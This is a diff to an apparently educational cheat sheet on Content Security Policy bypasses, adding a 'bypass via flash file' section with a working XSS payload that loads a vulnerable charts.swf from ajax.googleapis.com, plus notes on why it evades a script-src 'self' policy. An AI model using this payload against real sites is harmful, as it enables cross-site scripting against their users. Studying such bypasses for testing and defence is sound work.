@@ -55,20 +55,37 @@ CSP: content security policy | its a way to restrict what is allowed in the appl
 <b>ng-click:</b> enables angular js click method 
 
 <b>explanation:</b> basically the div is enabling some features (ng-app / ng-csp / ng-click) so it can be used by angular js as 'ajax.googleapis.com' 
-is allowed. as the div is calling angular it is needed to import the library to use the functions to call more actions. async feature is allowing 
-the automatic interaction needed to pop-up the click event.  
+is allowed. as the div is calling angular it is needed to import the library to use the functions to call more actions. async ;source is 
+allowing the automatic interaction needed to pop-up the click event.  
 	
 </details>	
 <details>
-<summary>bypass via Flash File</summary>
+<summary>bypass via flash file</summary>
+
+<b>sample:</b> 
+	content-security-policy: script-src 'self'
+
+<b>payload:</b>	
+<code>
+&lt;object type='application/x-shockwave-flash' data='https://ajax.googleapis.com/ajax/libs/yui/2.8.0r4/build/charts/assets/charts.swf?allowedDomain=\%22}
+)))}catch(e) {alert(/XSS/)}//'&gt;&lt;param name='AllowScriptAccess' value='always'>&lt;/object&gt;
+</code>
+
+<b>Notes:</b>	
+
+	1. this content security policy only allows scripts from the same domain itself.
+	2. it is only restricting scripts, but how about flash files ? ajax.googleapis.com is not explicitely allowed, however, via flash files
+	it can be call it.
+	3. each time you want to try flash csp by pass you need to use the HTML tag 'object'
+	4. 'charts.swf' is a vulnerable flash file to XSS, if not working, you can set your own or find other to trigger XSS.
 	
 </details>	
 <details>
-<summary>bypass via Polyglot File</summary>
+<summary>bypass via polyglot file</summary>
 	
 </details>
 <details>
-<summary>bypass via AngularJS</summary>
+<summary>bypass via angularJS</summary>
 	
 </details>		
 </div>
